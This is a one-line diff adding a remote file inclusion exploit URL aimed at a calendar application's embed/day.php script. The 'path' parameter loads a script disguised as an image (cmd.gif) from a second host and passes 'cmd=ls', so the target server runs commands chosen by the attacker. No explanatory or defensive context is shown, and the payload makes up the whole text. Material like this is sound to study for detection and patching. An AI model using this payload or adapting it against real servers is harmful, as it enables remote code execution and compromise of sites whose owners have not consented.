@@ -1,0 +1,1 @@
+http://www.example.com/[calendar_path]/embed/day.php?path=http://www.example2.com/cmd.gif?cmd=ls
